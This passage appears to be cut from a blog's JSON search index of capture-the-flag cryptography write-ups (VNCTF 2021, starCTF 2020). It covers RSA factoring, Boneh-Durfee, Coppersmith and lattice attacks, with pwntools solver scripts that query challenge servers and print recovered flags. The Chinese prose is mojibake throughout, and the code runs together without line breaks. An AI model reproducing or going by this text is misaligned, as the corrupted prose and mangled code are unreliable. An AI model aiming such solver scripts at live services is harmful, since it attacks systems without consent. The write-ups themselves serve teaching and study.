long_to_bytes(m)print(flag) åè®°è¿™é¢˜ä¸€ç‚¹éƒ½ä¸éš¾, åšäº†é‚£ä¹ˆä¹…å®Œå…¨å°±æ˜¯è„‘å­æ²¡è½¬è¿‡æ¥â€¦ è€—å­å°¾æ±, å¥½å¥½åæ€ AliceWantFlag studying~ EasyCurve studying~","link":"/2021/03/08/writeup-for-2021AntCTFxD-3CTF/"},{"title":"writeup for 2021VNCTF Crypto","text":"è¿™æ¬¡æ¯”èµ›å¬è¯´æ˜¯ç­¾åˆ°éš¾åº¦, å°±åšäº†ä¸€ä¸‹, ç»“æœä¹Ÿæ²¡èƒ½ak (è¯´ç®€å•éƒ½æ˜¯éª—äººçš„â€¦)å—¯â€¦ ä¼šåšçš„é¢˜ä¹Ÿæ²¡ä»€ä¹ˆæ”¶è·, ç¡¬è¦è¯´çš„è¯, whitegiveçš„ç¬¬ä¸€å±‚éœ€è¦é€šè¿‡è¿ç®—æŠŠå·²çŸ¥çš„æ¡ä»¶åˆåœ¨ä¸€èµ·æˆ–è€…æ¶ˆå»ä¸€äº›ä¸å¯èƒ½æ±‚å‡ºçš„å‚æ•°, è¿™ä¸ªä¸€ç›´éƒ½æ˜¯å¯†ç åˆ†æçš„åŸºç¡€å§, æ¥çœ‹çœ‹é¢˜å§ 0x00 wihtegiveproblem123456789101112131415161718192021222324252627282930313233343536from Crypto.Util.number import *from secret import urlfrom gmpy2 import *m = bytes_to_long(url)p = getPrime(512)q = getPrime(512)n = p * qd = getPrime(256)e = inverse(d,(p-1)*(q-1))c = pow(m,e,n)print(n)print(c)m = ep = getPrime(512)q = getPrime(512)n = p * p * qe = 0x10001d = inverse(e,lcm(p,lcm(p-1,q-1)))c = pow(m,e,n)hint = pow(d,e,n)print(n)print(c)print(hint)'''97814568264814384858194701955408461509880555772006698372422205341758322175891474378211599333051180365254844248340812534463000531890490435018379585036704801177155418066770861143206836558793774360498040810255823235715535487716966004194143204900564413879660115112965484824906920141847149888933004740523449213441861433117883636756846741136991930467817966389132430161525555721508581595005276740637546945145019997918755611429251549910005326287991856084650628145461081604344680988980407690210720073741565463149752405833474680260016336529404087791555793394709605710676529248146233711779010523020052891553050895882042043132611246903000089073759886267722667196003041462505274526737638837808213476294697746018085346623497511017543801377442390781101585650581984057653018703031659844145960721073451379508212905335383758157379301019575213158532070229897587088955814288202279949391608732448294591675986989254272257059551622461096394217684402667140362275595245430242117193793913872208576714597860532581116390903216389172132085635891741189355461016795362341416848534340615825023292174042406128959952508462840095293368043281511747192551431448088755251878915582522463097721381421883702408853564036431155676272901680250701398946525803160765527940151587567521509500006089852079864042238196362897144754722623523621230744820970423076092319608853809407595863195726851921082224085255808985329769890887863865121647796115540376158135632760785321953364738008064130705467326745546629505023549047992509562623348749056757848144371814157305011884825502144329268299851210747788785744509676701442642497798353940704045062680685297430840370664093043099033424646382070232242765761123110381200239132310785932203252095093993313010883982078216697297202940152563278231011836966627537170460186597134847633828107444548759805274516431300662852153808962421740187067058018192457264083227110866080267684557127718769967184710395811547902947248700889674967381917907905535103547918375731341071557144999864774198881339085314424766509424492349867615604684''' 1234567891011121314151617181920212223242526# Wow, you got here!# This is the last task, trust me!from Crypto.Util.number import *from secret import flag,paddingfrom gmpy2 import *m = bytes_to_long(flag)e = 7 p = getPrime(512)q = getPrime(512)n = p * qc1 = pow(m,e,n)c2 = pow(m+padding,e,n)print(n)print(c1)print(c2)'''143224951702807798608353389056046982493788310072914995404719898237226283884553121669729599925829562704800197375580487019006702401282671268969358774635337351738915083955659230582177495821699251999928502338923489031347921151957398310960671307216790020399224115377846788378990638367296298663795893865325304226511747971736575756405981407884108520168436125195883759681905797344209513741031295706378225472179679789113284198085292041435224541423031389590132208115584909516143143068493670684781907978850569227054030288567340952885222900553098805723215574937983620562167837775933861333476938929419281319459860877127378622637619209695919437085323423940852135308337887271742988391422139555924185234849146079306139570263602339983687993333013333937719071267190971983543492940032646907167417161479697805991443259327402389097539126399994414628326218438416138199892253597375493026563369334352434282120293396846427418323600336867792587721214''' å¥½å®¶ä¼™, è¿Cryptoéƒ½å¼€å§‹å¥—å¨ƒäº†, ä¸€å…±ä¸‰å±‚RSA, åšäº†å‰ä¸¤å±‚æ‰èƒ½çŸ¥é“ç¬¬ä¸‰å±‚ ç¬¬ä¸€å±‚ åˆ©ç”¨gcd()åˆ†è§£n e : 65537 c: å¯†æ–‡ hint: $hint = d^e (mod \\ n)$ è¿™é¢˜ä¸ç®—éš¾, ä»”ç»†ç®—ä¸€ä¸‹å°±èƒ½çŸ¥é“è¿™ä¸ªhintæœ‰ä»€ä¹ˆç”¨äº†é¦–å…ˆçœ‹ä¸€ä¸‹d = inverse(e,lcm(p,lcm(p-1,q-1))), $p$éƒ½å·²ç»æ˜¯ç´ æ•°äº†, å…¬å€æ•°è‚¯å®šæ˜¯$kp$ é‚£ä¹ˆæˆ‘ä»¬å°±æœ‰$$e \\cdot d = 1 (mod \\ kp)$$æŠŠhintçš„å¼å­å’Œè¿™ä¸ªå¼å­éƒ½æ”¹å†™æˆ:$$e \\cdot d = 1 + k_1p \\\\d^e = hint + k_2n$$è”ç«‹ä¸€ä¸‹å°±æœ‰:$$({k_1p+1 \\over e})^e = hint + k_2n \\Rightarrow (Kp+1) = e^e(hint + k_2n) \\\\\\Rightarrow (K-e^ek_2q)p = e^e \\cdot hint - 1$$å–ä¸ªgcd(e**e * hint - 1,n), å°±å¯ä»¥æœ‰päº†, åˆ†è§£nå°±å¥½åšäº†, è¿™ä¸€å±‚è¿˜æ˜¯æŒºæœ‰æ„æ€çš„ ç¬¬äºŒå±‚ Boneh_Durfee attackè¿™ä¸€å±‚çš„ç§é’¥$d \\approx 2^{256}$, è€Œ$n \\approx 2^{1024}$, æ»¡è¶³ä½¿ç”¨Boneh_Durfee attackçš„æ¡ä»¶, ç›´æ¥æ‰”åˆ°è„šæœ¬é‡Œè·‘å°±èƒ½è·‘å‡º$d$æ¥äº†æœ‰äº†$d$ç›´æ¥è§£å¯†å³å¯ ç¬¬ä¸‰å±‚ Coppersmithâ€™s Short-pad Attackç¬¬äºŒå±‚å‡ºæ¥ä¸€ä¸ªç½‘ç«™https://dawn-whisper.lanzous.com/iCAv0lod7yj-password:gzjq', ä»¥åŠå¯†ç  æ‰“å¼€åè¿˜æ˜¯ä¸€é“RSA å¦‚é¢˜, eå¤Ÿå°, ç›´æ¥ä¸Šè„šæœ¬å°±è¡Œ exp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960from gmpy2 import *from Crypto.Util.number import long_to_bytes# ç¬¬ä¸€å±‚e = 65537h = 788785744509676701442642497798353940704045062680685297430840370664093043099033424646382070232242765761123110381200239132310785932203252095093993313010883982078216697297202940152563278231011836966627537170460186597134847633828107444548759805274516431300662852153808962421740187067058018192457264083227110866080267684557127718769967184710395811547902947248700889674967381917907905535103547918375731341071557144999864774198881339085314424766509424492349867615604684n = 1246903000089073759886267722667196003041462505274526737638837808213476294697746018085346623497511017543801377442390781101585650581984057653018703031659844145960721073451379508212905335383758157379301019575213158532070229897587088955814288202279949391608732448294591675986989254272257059551622461096394217684402667140362275595245430242117193793913872208576714597860532581116390903216389172132085635891741189355461016795362341416848534340615825023292174042406128959c = 952508462840095293368043281511747192551431448088755251878915582522463097721381421883702408853564036431155676272901680250701398946525803160765527940151587567521509500006089852079864042238196362897144754722623523621230744820970423076092319608853809407595863195726851921082224085255808985329769890887863865121647796115540376158135632760785321953364738008064130705467326745546629505023549047992509562623348749056757848144371814157305011884825502144329268299851210747ee = pow(e, e)p = gcd(ee * h - 1, n)q = n // p ** 2phi = (p - 1) * p * (q - 1)d = invert(e,phi)e = pow(c, d, n)print(e)# ç¬¬äºŒå±‚# Boneh_Durfee attackå‡ºçš„ç»“æœ# è„šæœ¬åœ¨https://github.com/mimoo/RSA-and-LLL-attacks/blob/master/boneh_durfee.saged = 103079922798932082066165266087442072203677117380612800709240732626110126828541n = 97814568264814384858194701955408461509880555772006698372422205341758322175891474378211599333051180365254844248340812534463000531890490435018379585036704801177155418066770861143206836558793774360498040810255823235715535487716966004194143204900564413879660115112965484824906920141847149888933004740523449213441assert pow(pow(3,e,n),d,n) == 3c = 86143311788363675684674113699193046781796638913243016152555572150858159500527674063754694514501999791875561142925154991000532628799185608465062814546108160434468098898040769021072007374156546314975240583347468026001633652940408779155579339470960571067652924814623371177901052302005289155305089588204204313261print(long_to_bytes(pow(c,d,n)))# ç¬¬ä¸‰å±‚def short_pad_attack(c1, c2, e, n): PRxy.&lt;x,y&gt; = PolynomialRing(Zmod(n)) PRx.&lt;xn&gt; = PolynomialRing(Zmod(n)) PRZZ.&lt;xz,yz&gt; = PolynomialRing(Zmod(n)) g1 = x^e - c1 g2 = (x+y)^e - c2 q1 = g1.change_ring(PRZZ) q2 = g2.change_ring(PRZZ) h = q2.resultant(q1) h = h.univariate_polynomial() h = h.change_ring(PRx).subs(y=xn) h = h.monic() kbits = n.nbits()//(2*e*e) diff = h.small_roots(X=2^kbits, beta=0.4)[0] return diffdef related_message_attack(c1, c2, diff, e, n): PRx.&lt;x&gt; = PolynomialRing(Zmod(n)) g1 = x^e - c1 g2 = (x+diff)^e - c2 def gcd(g1, g2): while g2: g1, g2 = g2, g1 % g2 return g1.monic() return -gcd(g1, g2)[0]n = 143224951702807798608353389056046982493788310072914995404719898237226283884553121669729599925829562704800197375580487019006702401282671268969358774635337351738915083955659230582177495821699251999928502338923489031347921151957398310960671307216790020399224115377846788378990638367296298663795893865325304226511e = 7c1 = 74797173657575640598140788410852016843612519588375968190579734420951374103129570637822547217967978911328419808529204143522454142303138959013220811558490951614314306849367068478190797885056922705403028856734095288522290055309880572321557493798362056216783777593386133347693892941928131945986087712737862263761c2 = 9209695919437085323423940852135308337887271742988391422139555924185234849146079306139570263602339983687993333013333937719071267190971983543492940032646907167417161479697805991443259327402389097539126399994414628326218438416138199892253597375493026563369334352434282120293396846427418323600336867792587721214diff = short_pad_attack(c1, c2, e, n)m1 = related_message_attack(c1, c2, diff, e, n)long_to_bytes(m1) # VNCTF{H4ppyNeWy34r!2021_V&amp;N_figHt1ng!} 0x01 strange functionproblem1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495from Crypto.Util.number import *from hashlib import sha256from secret import flagimport socketserverimport signalimport stringimport randomimport osMENU = br'''[+] 1.function[+] 2.check_answer[+] 3.exit'''class Task(socketserver.BaseRequestHandler): # ä¸ºäº†ç¼©çŸ­ç¯‡å¹…, è¿™éƒ¨åˆ†æ²¡æœ‰ç‰¹åˆ«æ„ä¹‰çš„å‡½æ•°å°±çœç•¥äº† def proof_of_work(self): random.seed(os.urandom(8)) proof = ''.join([random.choice(string.ascii_letters+string.digits) for _ in range(20)]) _hexdigest = sha256(proof.encode()).hexdigest() self.send(f&quot;[+] sha256(XXXX+{proof[4:]}) == {_hexdigest}&quot;.encode()) x = self.recv(prompt=b'[+] Plz tell me XXXX: ') if len(x) != 4 or sha256(x+proof[4:].encode()).hexdigest() != _hexdigest: return False return True def function(self, x): res = 0 for i in range(self.lenth): numerator = ord(self.token[i]) denominator = x - self.data[i] try: tmp = numerator / denominator except Exception as e: self.send(b'[+] Error!') return res += tmp return res def handle(self): signal.alarm(1000) if not self.proof_of_work(): return self.send(b'[+] Welcome!') self.send(b'[+] Can you find the flag through the calculating?') self.score = 0 self.token = ''.join(random.sample(string.ascii_letters + string.digits, 16)) self.lenth = len(self.token) self.data = [] for i in range(self.lenth): self.data.append(getRandomInteger(32)) self.send(str(self.data).encode()) while True: self.send(MENU, newline=False) choice = self.recv() if(choice == b'1'): self.send(b&quot;[+] Plz give me your x: &quot;) now = int(self.recv().strip().decode()) now = self.function(now) self.send((&quot;[+] let me show you the answer: &quot;+str(now)).encode()) elif(choice == b'2'): guess = self.recv().strip().decode() if(guess == self.token): self.score += 1 self.send(b&quot;[+] You win!&quot;) self.send((&quot;[!] Now your score: &quot; + str(self.score)).encode()) self.token = ''.join([random.choice(string.digits + string.ascii_letters) for i in range((self.score+1)*16)]) self.lenth = len(self.token) self.data = [] for i in range(self.lenth): self.data.append(getRandomInteger(32)) self.send(str(self.data).encode()) if(self.score &gt;= 5): self.send(flag.encode()) else: self.send(b'[+] What do you want to say???') self.send(b'[!] Go away!') break else: break self.request.close()if __name__ == &quot;__main__&quot;: HOST, PORT = '0.0.0.0', 10002 server = ForkedServer((HOST, PORT), Task) server.allow_reuse_address = True server.serve_forever() åˆ†æå…ˆç†ä¸€ç†è¿™é¢˜åœ¨å¹²å˜›, è¦æˆ‘ä»¬å¹²å˜›å‰é¢å¸¸è§„çš„å·¥ä½œé‡è¯æ˜å°±ä¸è¯´äº† æ¯æ¬¡è®¿é—®æœåŠ¡ç«¯çš„æ—¶å€™, ä¼šä»abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789æŒ‘å‡º16ä½ä½œä¸ºtoken ç„¶åå°†tokenä¸­çš„æ¯ä¸€ä½çš„asciiç éƒ½ä¹˜ä¸€ä¸ªä¸åŒçš„éšæœºçš„æ•°(èŒƒå›´åœ¨$(0,2^{32})$), ä½œä¸ºdataç„¶åå‘ç»™å®¢æˆ·ç«¯å®¢æˆ·ç«¯å¯ä»¥è¾“å…¥ä¸€ä¸ªæ•°$x$è®©æœåŠ¡ç«¯è®¡ç®—:$$token =[t_0,t_1,\\cdots,t_n] \\\\data = [d_0,d_1,\\cdots,d_n] \\\\A = {t_0 \\over x - d_0} + {t_1 \\over x - d_1} + \\cdots + {t_n \\over x - d_n}$$ å¹¶è¿”å›ç»™å®¢æˆ·ç«¯ è§£é¢˜çš„ç›®æ ‡å°±æ˜¯é€šè¿‡æœåŠ¡ç«¯è¿”å›çš„$A$,(å¯ä»¥é‡å¤è¾“å…¥ä¸åŒçš„$x$è·å¾—ä¸åŒçš„$A$çŒœå‡ºäº”è½®çš„$token$(æ¯ä¸€è½®$token$çš„ä½æ•°éƒ½ä¼šå¢åŠ  å› ä¸ºè¿™é‡Œçš„$d_i$èŒƒå›´æ¯”è¾ƒå¤§, æ‰€ä»¥æ¯ä¸€ä¸ª$d$éƒ½ç›¸å·®æ¯”è¾ƒè¿œ, å½“$x = d_i + 1$çš„æ—¶å€™,${t_i \\over x - d_i} = t_i$ $|x - d_j| = |d_i + 1 - d_j|(j \\ne i)$ ä¼šç‰¹åˆ«å¤§æ‰€ä»¥äº‹å®ä¸Šæ¯æ¬¡è¾“å…¥$x = d_i + 1$çš„æ—¶å€™, æœ‰$$A_i = {t_0 \\over d_i+1-d_0 } + {t_1 \\over d_i+1 - d_1} + \\cdots + {t_n \\over d_i+1 - d_n} \\approx {t_i}$$æŠŠæ¯æ¬¡çš„$A_i$å››èˆäº”å…¥ä¹‹åå°±æ˜¯$t_i$äº†æ‰€ä»¥æ¯ä¸€è½®æŠŠ$x_0,x_1,\\cdots,x_n$éƒ½å‘é€ä¸€æ¬¡, å°±èƒ½å¾—åˆ°$t_0,t_1,\\cdots,t_n$äº† exp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051from pwn import *from hashlib import sha256import reprintable = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'def proof(END, SHA): for i in printable: for j in printable: for k in printable: for l in printable: start = i + j + k + l ensha = sha256((start+END).encode()).hexdigest() if ensha == SHA: print(start) return startcon = remote('node3.buuoj.cn',29406)resp = con.recvuntil(': ').decode()END = re.findall('XXXX\\+(.*)\\)',resp)[0]SHA = re.findall('== (.*)',resp)[0]con.send(proof(END,SHA).encode())resp = con.recvuntil('[-] ').decode()for _ in range(5): token = [] array = re.findall(r'\\d+', resp) data = [] for i in array: if len(i) &gt; 1: data.append(int(i)) for i in data: con.sendline('1') resp = con.recvuntil('[-] ').decode() con.sendline(str(i + 1)) resp = con.recvuntil('[-] ').decode() token.append(round(float(re.findall(r'let me show you the answer: (.*)', resp)[0]))) print(token) presend = '' for i in token: presend += chr(i) con.sendline('2') resp = con.recvuntil('[-] ').decode() con.sendline(presend) resp = con.recvuntil('[-] ').decode() print(resp)# flag{66a00c10-773f-4375-8a8e-444f0337bd31} 0x02 strange_function_revengeproblemè·Ÿä¸Šä¸€é¢˜çš„åŒºåˆ«ä¸å¤§, å°±ä¸è´´ä¸Šæ¥äº† åˆ†æè·Ÿç¬¬ä¸€é¢˜çš„åŒºåˆ«å°±åœ¨äºéšæœºæ•°çš„å¤§å°å˜å°äº†, è¿™æ ·ä¼šå¯¼è‡´æ¯ä¸ª$d$çš„å·®è·ä¸ä¼šå¤ªå¤§, å†å‘é€$x_i = d_i + 1$, è¿”å›çš„$A_i$å››èˆäº”å…¥å°±ä¸ä¸€å®šæ˜¯$t_i$äº†, è¿™é‡Œçš„è§£å†³åŠæ³•å°±æ˜¯å¯¹è¿”å›çš„$A_i$è¿›è¡Œä¸€æ¬¡ä¿®æ­£åå†å››èˆäº”å…¥ å› ä¸º$token$æ˜¯ä»abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789å–çš„, è¿™äº›å­—ç¬¦çš„asciiéƒ½æ˜¯è¿åœ¨ä¸€èµ·çš„, å¹³å‡æ•°æ˜¯86, æ¯æ¬¡å‘é€$x_i$çš„æ—¶å€™, æŠŠé™¤äº†$t_i$çš„å…¶ä»–$t$éƒ½å½“ä½œ86, è¿™æ ·å°±å¯ä»¥è®¡ç®—å‡º:$$offset_i = {86 \\over d_i + 1 - d_0}+{86 \\over d_i + 1 - d_1}+\\cdots+{86 \\over d_i + 1 - d_j} (i \\ne j)$$è¿™æ ·å°±å¯ä»¥æœ‰!$$A_i - offset_i \\approx t_i$$è·Ÿstrange_functionä¸€æ ·å‘é€æ•°æ®å°±è¡Œäº†ä¸è¿‡è¿™ä¸ªæ–¹æ³•ä¸å¤ªç¨³å®š, $offset$å¹¶ä¸èƒ½ä¿è¯æ¯æ¬¡éƒ½å‡†ç¡®çš„ä¿®æ­£$A$, æ”¾ä¸€é¦–å¥½è¿æ¥å¤šè·‘å‡ æ¬¡å§(å¤§æ¦‚è·‘äº†ä¸ƒå…«æ¬¡å§â€¦. exp1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859from pwn import *from hashlib import sha256import reprintable = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'A = 86def proof(END, SHA): for i in printable: for j in printable: for k in printable: for l in printable: start = i + j + k + l ensha = sha256((start+END).encode()).hexdigest() if ensha == SHA: print(start) return startcon = remote('node3.buuoj.cn',27609)resp = con.recvuntil(': ').decode()END = re.findall('XXXX\\+(.*)\\)',resp)[0]SHA = re.findall('== (.*)',resp)[0]con.send(proof(END,SHA).encode())resp = con.recvuntil('[-] ').decode()for _ in range(5): token = [] data = [] offset = [] array = re.findall(r'\\d+', resp) for i in array: if len(i) &gt; 1: data.append(int(i)) for i in data: psend = i + 1 sum = 0 for j in data: if i != j: sum += A / (psend - j) offset.append(sum) for i in data: con.sendline('1') resp = con.recvuntil('[-] ').decode() con.sendline(str(i + 1)) resp = con.recvuntil('[-] ').decode() token.append(round(float(re.findall(r'let me show you the answer: (.*)', resp)[0])-offset[data.index(i)])) print(token) presend = '' for i in token: presend += chr(i) con.sendline('2') resp = con.recvuntil('[-] ').decode() con.sendline(presend) resp = con.recvuntil('[-] ').decode() print(resp)# flag{dfd7a22a-0ac7-4b7a-9dad-9d321fa2fcfa} 0x03 fatcor å¯¹ç€æŸä¸ªpaperå†™äº†ä¸€ä¸‹åˆçš„algorithm, æ²¡åšå‡ºæ¥, tcltcltclâ€¦.. ç­‰wpå‡ºæ¥å†æ€»ç»“ä¸€ä¸‹ ç»“æœä¸€ä¸ªå¸ˆå‚…æ•™æˆ‘äº†hh problem1234567891011121314151617181920212223242526272829303132from Crypto.Util.number import *from gmpy2 import *from secret import flagdef get_public_key(d): while 1: p, q = getPrime(512), getPrime(512) N, phi, not_phi = p * q, (p - 1) * (q - 1), (p + 1) * (q + 1) try: e = inverse(d, not_phi) assert gcd(e, phi) == 1 break except: pass return (N, e)def encrypt(pubkey, m): N, e = pubkey c = pow(m, e, N) return cm = bytes_to_long(flag)d = getPrime(300)pubkeys = [get_public_key(d), get_public_key(d)]cs = encrypt(pubkeys[0], m), encrypt(pubkeys[1], m)print(pubkeys)print(cs)'''[(115483338707853323510117244601663937653032657454816581880428779391136584508645415322441921678179684904267659942318581245589538093236558206867210468172871004098796706517288570963560499418427771831765342801956281881820593084352360716457591198748797415842971188690055630073433785996545367137242661591939632740177, 57942961120648999071495995119939754708884253716257622598699627649519120883383654560602196191747110519111036450217116739928381611061803307053632035548944075112790103258912149703053932492832060534126356062378027983000713091223894604748395826345780826674822582205573649323340945351657354960324397873669889767611), (53622548101803784449246949981043962044702821559359430270342163843702543781580388956841660273746825211912789196955019345268896290156568895362182295889379787233440464948232717888315385094207004043907898658611926470834448875571292174245716821120409044389816082878077188546182422805778560826667364235348059795229, 37629174280947918845570975617525141920002123382327456934545962737176558640617579710289304146119507880547361939594011152968663070025066085778798378563965349218834887746411017240322083056673687330052590220772859205859051875687741541958997904176801239206348298021023694604932588913541173039972303193792987583003)](51861394323132582263685584977796608641129485967610029542263453128833142621927008505594685713111162217651119546991411861320042282788909858323941435593508384080858965324662410947546608051702238057613339996124961723578887443100478753831786550701578678090466528863014222331341645240511640398819027209200809466160, 53200507591144017820710284362261363695745231005527161900426580605551005076410241969689161754211964469126847594337121140420040532547631617290907291418063708630323838133357597795892690304405706577096504918510233628396424543417886828387510407109281423448827267022542075484645277275676556239547911837897827866040)''' åˆ†ææŠ„äº†é‚£ä¹ˆä¹…çš„paperå±…ç„¶æ˜¯ç”¨æ ¼å­åšçš„! æ„Ÿè°¢d33b4t0å¸ˆå‚…æŒ‡ç‚¹æ‰å¼„å‡ºè¿™é¢˜ è¿™é¢˜ç»™å‡ºäº†ä¸€ä¸ª300-bitçš„$d$, å†æ ¹æ®è¿™ä¸ª$d$ç”Ÿæˆäº†ä¸¤å¥—å…¬é’¥$n_1,n_2,e_1,e_2$ å…³ç³»å¼ä¸º$$e_1 \\cdot d = 1 + k_1(p_1+1)(q_1+1) \\\\e_2 \\cdot d = 1 + k_2(p_2+1)(q_2+1)$$è®°$p_1+q_1+1 = s_1, p_2+q_2+1 = s_2$, æŠŠå¼å­åŒ–ä¸€ä¸‹å°±æœ‰$$e_1 \\cdot d - k_1n_1 = k_1s_1+1 \\\\e_2 \\cdot d - k_2n_2 = k_2s_2+1$$è‡ªå·±åšçš„æ—¶å€™åªç”¨çš„å…¶ä¸­çš„ä¸€ä¸ªå¼å­é€ äºŒç»´æ ¼å­, ç»“æœæ­»æ´»éƒ½è§„çº¦ä¸å‡ºæ¥(ä¹Ÿä¸çŸ¥é“ä¸ºå•¥, ä»¥åèƒ½é€ ä¸‰ç»´å°±è¯•è¯•é€ ä¸‰ç»´å§. ç”¨è¿™ä¸¤ä¸ªå¼å­é€ å‡ºä¸€ä¸ªä¸‰ç»´æ ¼å­$$(d ,-k_1,-k_2) =\\begin{pmatrix}\\sqrt n_1&amp;e_1&amp;e_2 \\\\0&amp;n_1&amp;0 \\\\0&amp;0&amp;n_2\\end{pmatrix}=(d\\sqrt n_1,k_1s_1+1,k_2s_2+1)$$(è‡³äºä¸ºå•¥æœ‰ä¸ª$\\sqrt n_1$, å½“ç„¶æ˜¯ä¸ºäº†è°ƒæ•´ä¸€ä¸‹èŒƒæ•°! å‘é‡çš„é•¿åº¦ä¹Ÿæ˜¯åˆé€‚çš„(å¾—é $d, k ,s$çš„ä½æ•°æ¥åˆ¤æ–­ é€šè¿‡è§„çº¦è¿™ä¸ªæ ¼å­, æœ‰äº†$(d\\sqrt n_1,k_1s_1+1,k_2s_2+1)$, å°±èƒ½å¾—å‡º$d$ å‰©ä¸‹çš„å°±æ˜¯å·²çŸ¥$e,d,n$æ±‚$phi$äº†, ä¸è¿‡è¿™é‡Œçš„$d$æœ‰ç‚¹ä¸å¤ªä¸€æ ·æ³¨æ„ä¸€ä¸‹å°±okäº† exp12345678910111213141516171819202122from Crypto.Util.number import long_to_bytes as l2b ,isPrimen1 = 115483338707853323510117244601663937653032657454816581880428779391136584508645415322441921678179684904267659942318581245589538093236558206867210468172871004098796706517288570963560499418427771831765342801956281881820593084352360716457591198748797415842971188690055630073433785996545367137242661591939632740177n2 = 53622548101803784449246949981043962044702821559359430270342163843702543781580388956841660273746825211912789196955019345268896290156568895362182295889379787233440464948232717888315385094207004043907898658611926470834448875571292174245716821120409044389816082878077188546182422805778560826667364235348059795229e1 = 57942961120648999071495995119939754708884253716257622598699627649519120883383654560602196191747110519111036450217116739928381611061803307053632035548944075112790103258912149703053932492832060534126356062378027983000713091223894604748395826345780826674822582205573649323340945351657354960324397873669889767611e2 = 37629174280947918845570975617525141920002123382327456934545962737176558640617579710289304146119507880547361939594011152968663070025066085778798378563965349218834887746411017240322083056673687330052590220772859205859051875687741541958997904176801239206348298021023694604932588913541173039972303193792987583003half_n = round(sqrt(n))L = Matrix([[half_n ,e1 ,e2], [0 ,n1 ,0], [0 ,0 ,n2]])res = L.LLL()[0]assert abs(res[0]) % half_n == 0d = abs(res[0]) // half_nif isPrime(d) : knophi = e1 *d - 1 nophi = knophi // (knophi // n1 ) pq = nophi - n - 1 phi = n -pq +1 d1 = inverse_mod(e1,phi) print(l2b(pow(cs[0],d1,n1)))# b'vnctf{7d47956b-bc55-4897-a550-cda0b221ce67}' åè®°è¿™é¢˜åšå®Œæ„Ÿè§‰æ”¶è·è¿˜æ˜¯æœ‰çš„, ä¸åƒå‰é¢çš„å‡ é¢˜ Latticeæ˜¯ä¸€ä¸ªç¥å¥‡çš„ä¸œè¥¿, ä¸€å®šè¦æŠŠæ‰€æœ‰æ–¹ç¨‹å†™å‡ºæ¥, è¯¥è”ç«‹çš„è”ç«‹, æ ¹æ®æœªçŸ¥é‡å’Œå·²çŸ¥é‡ä»¥åŠè¿™äº›æ•°çš„ä½æ•°,é€ å‡ºåˆé€‚çš„Latticeæ‰èƒ½æ±‚å‡ºå‡ºé¢˜äººæƒ³è¦æˆ‘ä»¬è§„çº¦å‡ºçš„é‚£ä¸ªæœ€çŸ­å‘é‡æ¥","link":"/2021/03/14/writeup-for-2021VNCTF/"},{"title":"writeup for 2020 starCTF Crypto","text":"æ€»ä¹‹å°±æ˜¯åƒè€æœ¬æ€»ä¹‹å°±æ˜¯æ›²çº¿å¥½éš¾è¿™æ¬¡å°±å·®ä¸€é“MyCurveâ€¦æ‰¾ä¸ªå¸ˆå‚…å­¦ä¹ å­¦ä¹ å†è¡¥å……è¿™ä¸ª Crypto MyEnc GuessKey2 little case MyCurve MyEncnc 52.163.228.53 8081é™„ä»¶: 12345678910111213141516171819202122232425from Crypto.Util.number import getPrime,bytes_to_longimport time,urandomfrom flag import flagiv=bytes_to_long(urandom(256))assert len(flag)==15keystream=bin(int(flag.encode('hex'),16))[2:].rjust(8*len(flag),'0')p=getPrime(1024)q=getPrime(1024)n=p*qprint &quot;n:&quot;,ncnt=0while True: try: print 'give me a number:' m=int(raw_input()) except: break ct=iv for i in range(1,8): if keystream[cnt]=='1': ct+=pow(m^q,i**i**i,n) ct%=n cnt=(cnt+1)%len(keystream) print &quot;done:&quot;,ct stream cipherçš„å‘³é“flag å³ keystream å…±120ä½æ¯æ¬¡è¾“å…¥ä¸€ä¸ªm , æ ¹æ®keyçš„7ä½è¿”å›ä¸€ä¸ªctç¬¬1ä¸ªmå¯¹åº”keyçš„06ç¬¬2ä¸ªmå¯¹åº”keyçš„713â€¦ç¬¬17ä¸ªmå¯¹åº”keyçš„112118ç¬¬18ä¸ªmå¯¹åº”keyçš„1195â€¦120ä¸ªmåˆ™ä¼šå›åˆ°åˆšå¼€å§‹ä¸€æ · è€Œé‡å¤ä¼ åŒæ ·çš„mçš„æ—¶å€™, å¦‚æœå–keyçš„7ä½æ˜¯ç›¸åŒçš„, é‚£ä¹ˆè¿”å›çš„ctä¹Ÿæ˜¯ç›¸åŒçš„, æ ¹æ®è¿™ä¸ªç‰¹ç‚¹, é‡å¤ä¼ 120ä¸ªm=0, å¯ä»¥å¾—åˆ°ä¸€äº›è¿”å›ç›¸åŒctçš„7ä½, ä¹Ÿå°±æ˜¯keyé‡Œé¢ç›¸åŒçš„ä¸¤ä¸ª7ä½ 123456789101112131415161718192021222324252627282930313233343536373839404142from pwn import *from hashlib import sha256import reprintable = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'con = remote('52.163.228.53', 8081)def proof(END, SHA): for i in printable: for j in printable: for k in printable: for l in printable: start = i + j + k + l ensha = sha256((start + END).encode()).hexdigest() if ensha == SHA: print(start) return start.encode()resp = con.recvuntil('xxxx:').decode()END = re.findall(r'xxxx\\+(.*)\\) ==', resp)[0]SHA = re.findall(r'== (.*)', resp)[0]print(resp)resp = con.recv().decode()print(resp)con.sendline(proof(END, SHA))resp = con.recvuntil('number:').decode()print(resp)arr = []for _ in range(120): con.sendline('0'.encode()) resp = con.recvuntil('number:').decode() num = int(resp[6:-17]) if num not in arr: arr.append(num) else: arr.append(-1) print(_, arr.index(num)) å¾—åˆ°çš„è¾“å‡ºä¸º: 12345678910111213141516171819202122232425262728293031323334353615 1226 1432 137 943 3152 5154 1460 4869 5871 3176 3977 6580 881 3882 4885 6386 3188 4890 792 1793 5694 296 6498 7099 0100 12103 48104 12105 65106 49110 73112 72114 78115 87117 29118 83 ç¬¬ä¸€è¡Œçš„15 12ä»£è¡¨ç€, keyçš„15* 715* 7+6 == 12* 712* 7+6ä¹Ÿå°±æ˜¯key[105:112] == 